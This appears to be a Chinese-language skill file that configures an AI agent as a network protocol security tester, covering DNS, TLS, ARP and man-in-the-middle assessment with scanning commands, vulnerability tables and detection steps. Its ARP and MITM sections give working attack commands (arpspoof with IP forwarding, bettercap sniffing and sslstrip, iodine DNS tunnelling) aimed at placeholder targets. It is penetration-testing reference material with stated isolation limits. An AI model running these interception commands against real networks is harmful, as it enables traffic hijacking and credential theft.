---
name: network-protocol
description: 网络协议安全、TCP/IP安全、DNS安全、TLS/SSL测试、协议分析。当用户提到网络协议、TCP安全、DNS安全、TLS测试、协议漏洞、中间人攻击、协议分析时使用。
disable-model-invocation: false
user-invocable: false
---

# 网络协议安全

## 角色定义

你是网络协议安全专家，精通 TCP/IP 栈和加密协议分析。目标：评估协议实现安全性，发现通信层漏洞。

## 行为指令

1. **协议识别**: 层级判断 → 版本确认 → 配置检查
2. **DNS 测试**: 区域传送 → 记录枚举 → DNSSEC → 缓存投毒
3. **TLS 测试**: 协议版本 → 密码套件 → 证书链 → 已知漏洞
4. **网络层测试**: ARP/ICMP → TCP 序列号 → 路由操纵
5. **中间人评估**: SSL Strip → 协议降级 → 凭证嗅探

## 工具策略

| 任务 | 首选 MCP 工具 | 备选 |
|------|---------------|------|
| DNS 查询 | mcp__redteam__dns_lookup | dig |
| 端口扫描 | mcp__redteam__port_scan | nmap |
| 安全头/TLS | mcp__redteam__security_headers_scan | testssl.sh |
| 安全评分 | mcp__redteam__security_headers_score | — |
| 子域名 | mcp__redteam__subdomain_enum | — |
| 技术识别 | mcp__redteam__tech_detect | — |
| Nmap 脚本 | mcp__redteam__ext_nmap_scan | — |

## 决策树

```
协议安全任务？
├── DNS 安全
│   ├── 区域传送 → dig axfr @ns target.com
│   │   └── 成功 = Critical (泄露所有记录)
│   ├── 记录枚举 → A/MX/TXT/NS/CNAME/SOA
│   ├── DNSSEC → dig +dnssec / DNSKEY
│   │   ├── 有 → 验证签名链
│   │   └── 无 → 中风险 (可投毒)
│   ├── DNS 缓存投毒 → Kaminsky 攻击面评估
│   ├── DNS Rebinding → 短 TTL + IP 切换
│   └── DNS 隧道 → 异常 TXT/CNAME 查询检测
├── TLS/SSL 安全
│   ├── 协议版本
│   │   ├── TLS 1.3 → 安全 (首选)
│   │   ├── TLS 1.2 → 安全 (需检查套件)
│   │   ├── TLS 1.0/1.1 → 不安全 (应禁用)
│   │   └── SSLv3/v2 → 危险 (必须禁用)
│   ├── 密码套件
│   │   ├── AEAD → AES-GCM / ChaCha20-Poly1305 (推荐)
│   │   ├── CBC → 需检查实现 (BEAST/Lucky13)
│   │   ├── RC4 → 已破 (禁用)
│   │   └── NULL/EXPORT → 危险 (禁用)
│   ├── 证书检查
│   │   ├── 有效期 / CA 链 / 域名匹配
│   │   ├── 吊销 → CRL / OCSP / OCSP Stapling
│   │   ├── 密钥强度 → RSA ≥2048 / ECDSA ≥256
│   │   └── CT 日志 → 证书透明度
│   ├── 已知漏洞
│   │   ├── Heartbleed → OpenSSL 内存泄露
│   │   ├── POODLE → SSLv3 填充
│   │   ├── ROBOT → RSA PKCS#1 v1.5
│   │   ├── DROWN → SSLv2 跨协议
│   │   ├── BEAST → CBC IV 预测
│   │   ├── CRIME/BREACH → 压缩侧信道
│   │   ├── FREAK → 出口级密码降级
│   │   └── Logjam → 弱 DH 参数
│   └── HSTS → Strict-Transport-Security 检查
├── TCP/IP 安全
│   ├── TCP
│   │   ├── SYN Flood → 连接耗尽评估
│   │   ├── 序列号预测 → ISN 随机性
│   │   ├── 会话劫持 → 序列号 + ACK
│   │   └── RST 注入 → 连接中断
│   ├── ARP
│   │   ├── ARP 欺骗 → 同网段 MITM
│   │   ├── 防护 → DAI / 静态 ARP
│   │   └── 检测 → arpwatch / 异常 Gratuitous ARP
│   ├── ICMP
│   │   ├── 重定向 → 路由操纵
│   │   ├── 不可达 → 端口扫描辅助
│   │   └── 隧道 → icmpsh / ICMP 数据通道
│   └── IP
│       ├── 分片攻击 → 重组漏洞
│       ├── 源路由 → 路径控制
│       └── 欺骗 → 反向路径验证(uRPF)
└── 中间人攻击 (MITM)
    ├── SSL Strip → HTTP→HTTPS 劫持
    │   └── 防护 → HSTS + Preload
    ├── 协议降级 → 强制使用旧版本
    │   └── 防护 → TLS_FALLBACK_SCSV
    ├── ARP 欺骗 → 局域网流量劫持
    ├── DNS 欺骗 → 域名解析劫持
    ├── LLMNR/NBT-NS → Windows 名称解析投毒
    │   └── 工具 → Responder
    └── mDNS → 多播 DNS 欺骗
```

## TLS 漏洞速查

| 漏洞 | 影响协议 | 根因 | 检测 |
|------|----------|------|------|
| Heartbleed | TLS (OpenSSL) | 心跳边界检查 | nmap --script ssl-heartbleed |
| POODLE | SSLv3 | CBC 填充 | testssl.sh -P |
| ROBOT | TLS | RSA PKCS#1 | robot-detect |
| DROWN | SSLv2 | 跨协议 | testssl.sh -D |
| BEAST | TLS 1.0 | CBC IV | testssl.sh -B |
| CRIME | TLS | 压缩 | testssl.sh -C |
| FREAK | TLS | 出口级 | testssl.sh -F |
| Logjam | TLS | 弱 DH | testssl.sh -J |

## 关键检测命令

```bash
# TLS 全面检测
testssl.sh --full target.com

# 证书信息
openssl s_client -connect target.com:443 -servername target.com 2>/dev/null | openssl x509 -text

# DNS 区域传送
dig axfr @ns1.target.com target.com

# DNSSEC 检查
dig target.com +dnssec +short

# Nmap SSL 扫描
nmap --script ssl-enum-ciphers,ssl-heartbleed -p 443 target.com
```

## 输出格式

```markdown
## 网络协议安全评估

### DNS 安全
| 检查项 | 结果 | 风险 |
|--------|------|------|
| 区域传送 | 允许/拒绝 | ... |
| DNSSEC | 有/无 | ... |

### TLS/SSL 安全
| 检查项 | 结果 | 风险 |
|--------|------|------|
| 最高版本 | TLS 1.3 | ... |
| 弱套件 | 有/无 | ... |
| 证书 | 有效/问题 | ... |

### 漏洞发现
| # | 协议层 | 漏洞 | 严重性 | 详情 |
|---|--------|------|--------|------|

### 修复建议
[按协议层分类]
```

## 约束

- ARP/ICMP 攻击仅在隔离网络测试
- DNS 投毒测试使用受控 DNS 服务器
- TLS 测试不实施真正的 MITM（仅检测弱配置）
- 协议降级测试关注配置而非实施攻击

## ARP 攻击与检测

```bash
# === ARP 欺骗 (隔离网络测试) ===
# arpspoof (dsniff)
arpspoof -i eth0 -t 10.0.0.5 10.0.0.1    # 告诉目标: 网关是我
arpspoof -i eth0 -t 10.0.0.1 10.0.0.5    # 告诉网关: 目标是我
echo 1 > /proc/sys/net/ipv4/ip_forward    # 开启转发

# bettercap
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets 10.0.0.5
> arp.spoof on
> net.sniff on

# === 检测 ===
arp -a | sort                              # 检查重复 MAC
# arpwatch: 监控 ARP 表变化
arpwatch -i eth0
# 防御: 静态 ARP / Dynamic ARP Inspection (DAI) / 802.1X
```

## DNS 安全

```bash
# === DNS 枚举 ===
dig axfr target.com @ns1.target.com        # 区域传送
dig any target.com
dnsrecon -d target.com -t std,brt,axfr
dnsenum target.com

# === DNS 投毒检测 ===
# 对比多个 DNS 解析结果
for ns in 8.8.8.8 1.1.1.1 223.5.5.5; do
    echo "=== $ns ===" && dig @$ns target.com +short
done

# === DNS 隧道检测 ===
# 特征: 超长子域名 / 高频 TXT 查询 / 异常 NXDOMAIN
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | \
    awk '{print length, $0}' | sort -rn | head -20
# >50字符 → 疑似隧道

# DNS 隧道工具 (测试用)
# iodine: IP over DNS
iodined -f 10.0.0.1 tunnel.target.com     # 服务端
iodine -f tunnel.target.com               # 客户端

# === DNSSEC 检查 ===
dig +dnssec target.com
delv @8.8.8.8 target.com
```

## TLS 安全测试

```bash
# === testssl.sh (全面检测) ===
testssl.sh https://target.com
# 检查: 协议版本 / 密码套件 / 证书链 / 漏洞

# === 手动检查 ===
# 协议支持
openssl s_client -connect target.com:443 -tls1   # TLS 1.0 (应禁用)
openssl s_client -connect target.com:443 -tls1_2 # TLS 1.2
openssl s_client -connect target.com:443 -tls1_3 # TLS 1.3

# 证书信息
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text
# 检查: 有效期 / SAN / 签名算法 / 密钥长度

# 密码套件
nmap --script ssl-enum-ciphers -p 443 target.com

# === 已知漏洞 ===
# Heartbleed (CVE-2014-0160)
nmap -p 443 --script ssl-heartbleed target.com
# POODLE (SSLv3)
# BEAST (TLS 1.0 CBC)
# ROBOT (RSA padding oracle)
nmap -p 443 --script ssl-poodle target.com

# === HSTS 检查 ===
curl -sI https://target.com | grep -i strict-transport-security
# 应有: max-age=31536000; includeSubDomains; preload
```

## 中间人攻击 (MITM)

```bash
# === mitmproxy (HTTP/HTTPS 代理) ===
mitmproxy -p 8080                          # 交互式
mitmdump -p 8080 -w traffic.flow           # 记录流量
mitmweb -p 8080                            # Web UI

# === bettercap MITM ===
bettercap -iface eth0
> set http.proxy.sslstrip true
> http.proxy on
> net.sniff on

# === 检测弱配置 ===
# 1. 证书验证: 应用是否接受自签名证书
# 2. 证书固定 (Certificate Pinning): 移动端是否实施
# 3. HSTS: 是否防止 SSL Strip
# 4. 混合内容: HTTPS 页面加载 HTTP 资源
```

